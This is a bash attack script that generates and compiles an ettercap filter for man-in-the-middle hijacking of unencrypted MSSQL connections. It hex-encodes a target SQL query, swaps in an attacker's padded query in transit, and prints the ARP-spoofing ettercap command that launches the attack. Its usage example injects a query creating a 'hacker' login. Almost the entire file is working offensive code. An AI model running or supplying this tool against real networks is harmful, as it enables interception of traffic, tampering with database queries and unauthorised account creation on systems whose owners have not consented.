#!/bin/bash
#
############################################################################################
#
# Originally Written by Rick Osgood
#
# This script is designed to automate the process of hijacking an MSSQL database connection.
# This script can be used to perform a MITM attack between two IP addresses using ettercap
# and ARP spoofing. You also submit an original SQL query and a new SQL query. The script
# will create, compile, and load an ettercap filter to replace the original SQL query with
# your new one.This should work on any MSSQL conncetion that is not encrypted.
#
############################################################################################
#
# Updated (20170124) by YGHT in order to:
# - make this a script that just produces the filter so that custom execution is possible
# - remove requirements for target IP addresses as this was too restrictive when in the field
# - add a bit more granularity / verbosity to the output Etterfilter
# - added the option for the hex generation to remove \x00 chars from between normal chars
# - added the ability to have multiple target SQL queries supplied from a file, one line each
#
############################################################################################


args=("$@") #array to store command line arguments

# Set variable defalts
SqlPort=1433 
FileName="NULL"
OldQueryFile="NULL"
RemoveZeros=0

# Help function
print_help(){
        echo "Usage: ./SQLInject.sh -o [original SQL query] -i [new SQL query]"
        echo ""
        echo "Example: ./SQLInject.sh -o \"SELECT * from Products WHERE ProductID=1;\" -i \"CREATE LOGIN hacker WITH PASSWORD=\"password01\";\"--"
        echo ""
        echo "This script creates an ettercap filter that will identify a SQL query"
        echo "and replace it with a new query. The script will then compile the filter"
        echo "and run ettercap with the filter loaded. Ettercap will perform an ARP"
        echo "spoofing attack against the specified IP addresses automatically. All you"
        echo "have to do is sit back and wait for the original query to be submitted."
        echo ""
        echo " --help"
        echo "     Show this message."
        echo " -o"
        echo "     Specify the original SQL query to be replaced."
        echo " -O"
        echo "     Specify file containing line-separated original SQL queries to be replaced."
        echo " -i"
        echo "     Specify the new SQL query to be injected. This query must not longer than the original query."
        echo " -0"
        echo "     Remove the '\x00' chars between normal chars: useful for some queries"
        echo " -f"
        echo "     Specify the output filename for the ettercap filter."
        echo " -p"
        echo "     Optional. Specifiy the MSSQL traffic port. Defaults to 1433."
}

# If not enough arguments then quit
if [ $# -lt "3" ]; then
        print_help
        exit 1
fi

COUNTER=0 #Count from zero to number of arguments
while [ $COUNTER -lt $# ]; do
        if [ "${args[$COUNTER]}" == "--help" ]; then
                print_help
                exit 0

        elif [ "${args[$COUNTER]}" == "-o" ]; then
                COUNTER=$(($COUNTER+1))
                OldQuery=${args[$COUNTER]}

        elif [ "${args[$COUNTER]}" == "-O" ]; then
                COUNTER=$((COUNTER+1))
                OldQueryFile=${args[$COUNTER]}

        elif [ "${args[$COUNTER]}" == "-i" ]; then
                COUNTER=$((COUNTER+1))
                NewQuery=${args[$COUNTER]}

        elif [ "${args[$COUNTER]}" == "-s" ]; then
                COUNTER=$((COUNTER+1))
                ServerIP=${args[$COUNTER]}

        elif [ "${args[$COUNTER]}" == "-c" ]; then
                COUNTER=$((COUNTER+1))
                ClientIP=${args[$COUNTER]}

        elif [ "${args[$COUNTER]}" == "-f" ]; then
                COUNTER=$((COUNTER+1))
                FileName=${args[$COUNTER]}

        elif [ "${args[$COUNTER]}" == "-0" ]; then
                COUNTER=$((COUNTER+1))
                RemoveZeros=1

        elif [ "${args[$COUNTER]}" == "-p" ]; then
                COUNTER=$((COUNTER+1))
                SqlPort=${args[$COUNTER]}

        else
                echo "Error: Unknown argument \"${args[$COUNTER]}\""
                echo ""
                print_help
                exit 1
        fi

        COUNTER=$(($COUNTER+1))
done;

# Is anything missing?
if [ "$FileName" == "NULL" ]; then
        echo "You must specify the file name for the ettercap filter!"
        exit 1
fi


#========================


# if only one query is to be poisoned...
if [ "$OldQueryFile" == "NULL" ]; then

  # Calculate length of original SQL query
  length1=`echo $OldQuery | wc -m`
  length1=$((length1 - 1))
  echo "Original query is $length1 bytes"

  # Calculate length of injected SQL query
  length2=`echo $NewQuery | wc -m`
  length2=$((length2 - 1))
  echo "New query is $length2 bytes"

  # What's the length difference?
  difference=$((length1 - length2))
  echo "Difference is $difference bytes"

  # If the new query is too long it won't work
  if [ $difference -lt 0 ]; then
          echo "New SQL query is longer than original! Quitting..."
          echo ""
          exit 0
  fi

  temp=""
  for i in `seq 1 $difference`;
  do
          temp="$temp "
  done
  PaddedQuery="$NewQuery$temp"
  echo "PaddedQuery is \"$PaddedQuery\""
  echo ""

  echo "Converting original query to hex..."
  if [ $RemoveZeros -lt 1 ]; then
    # leave zeros in place
    #             convert to plain hex | every 2 chars add \x00\x | add \x to begin     | remove trail \x    | remove trail \x00 | remove new lines
    OldQueryHex=`echo $OldQuery | xxd -p | sed 's/../&\\\x00\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
  else
    # remove zeros
    OldQueryHex=`echo $OldQuery | xxd -p | sed 's/../&\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
  fi

  echo "Converting new query to hex..."
  if [ $RemoveZeros -lt 1 ]; then
    # leave zeros in place
    NewQueryHex=`echo $PaddedQuery | xxd -p | sed 's/../&\\\x00\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
  else
    # remove zeros
    NewQueryHex=`echo $PaddedQuery | xxd -p | sed 's/../&\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
  fi

  echo "Writing ettercap filter now..."

  # Start writing actual ettercap filter file
  echo "if (ip.proto == TCP && tcp.dst == $SqlPort)" > $FileName
  echo "{" >> $FileName
  echo "  if (regex(DATA.data, \"^\\x01\"))" >> $FileName
  echo "  {" >> $FileName
  echo "    msg(\"SQL query detected\");" >> $FileName
  echo "    if (search(DATA.data,\"$OldQueryHex\"))" >> $FileName
  echo "    {" >> $FileName
  echo "      msg(\"Target query detected\");" >> $FileName
  echo "      replace(\"$OldQueryHex\",\"$NewQueryHex\");" >> $FileName
  echo "      msg(\"Evil query injected\");" >> $FileName
  echo "    }" >> $FileName
  echo "  }" >> $FileName
  echo "}" >> $FileName

#===================================================
else # read file for multiple queries to be poisoned
#===================================================

  echo `cat $OldQueryFile | wc -l`" queries found"

  echo "Writing head of ettercap filter now..."
  echo '' > $FileName
  echo "if (ip.proto == TCP && tcp.dst == $SqlPort)" >> $FileName
  echo "{" >> $FileName
  echo "  if (regex(DATA.data, \"^\\x01\"))" >> $FileName
  echo "  {" >> $FileName
  echo "    msg(\"SQL query detected\");" >> $FileName

################ old queries loop starts here
  while read OldQuery; do
    echo ""
    # Calculate length of original SQL query
    length1=`echo $OldQuery | wc -m`
    length1=$((length1 - 1))
    echo "Original query is $length1 bytes"

    # Calculate length of injected SQL query
    length2=`echo $NewQuery | wc -m`
    length2=$((length2 - 1))
    echo "New query is $length2 bytes"

    # What's the length difference?
    difference=$((length1 - length2))
    echo "Difference is $difference bytes"

    # If the new query is too long it won't work
    if [ $difference -lt 0 ]; then
            echo "New SQL query is longer than original! Abandoning this query..."
            continue
    fi

    temp=""
    for i in `seq 1 $difference`;
    do
      temp="$temp "
    done
    PaddedQuery="$NewQuery$temp"
    echo "PaddedQuery is \"$PaddedQuery\""

    echo "Converting original query to hex..."
    if [ $RemoveZeros -lt 1 ]; then
      # leave zeros in place
      #             convert to plain hex | every 2 chars add \x00\x | add \x to begin     | remove trail \x    | remove trail \x00 | remove new lines
      OldQueryHex=`echo $OldQuery | xxd -p | sed 's/../&\\\x00\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
    else
      # remove zeros
      OldQueryHex=`echo $OldQuery | xxd -p | sed 's/../&\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
    fi

    echo "Converting new query to hex..."
    if [ $RemoveZeros -lt 1 ]; then
      # leave zeros in place
      NewQueryHex=`echo $PaddedQuery | xxd -p | sed 's/../&\\\x00\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
    else
      # remove zeros
      NewQueryHex=`echo $PaddedQuery | xxd -p | sed 's/../&\\\x/g' | sed "s/^/&\\\\\x/g" | sed "s/\\\\\x$//g" | sed "s/\\\\\x00$//g" | tr -d '\n'`
    fi

    echo "Writing ettercap filter now..."

    # Start writing actual ettercap filter file
    echo "    if (search(DATA.data,\"$OldQueryHex\"))" >> $FileName
    echo "    {" >> $FileName
    echo "      msg(\"Target query detected\");" >> $FileName
    echo "      replace(\"$OldQueryHex\",\"$NewQueryHex\");" >> $FileName
    echo "      msg(\"Evil query injected\");" >> $FileName
    echo "    }" >> $FileName
  done < $OldQueryFile
################ old queries loop ends here

  echo "Writing tail of ettercap filter now..."
  echo "  }" >> $FileName
  echo "}" >> $FileName

fi

# Exeute etterfilter to create the compiled filter
etterfilter $FileName -o $FileName.ef

# Execute ettercap and load the filter
echo "The following command will start the attack:"
echo "ettercap -T -Q -F ./$FileName.ef -M arp:remote ////"

echo ""
echo "Completed Successfully!"
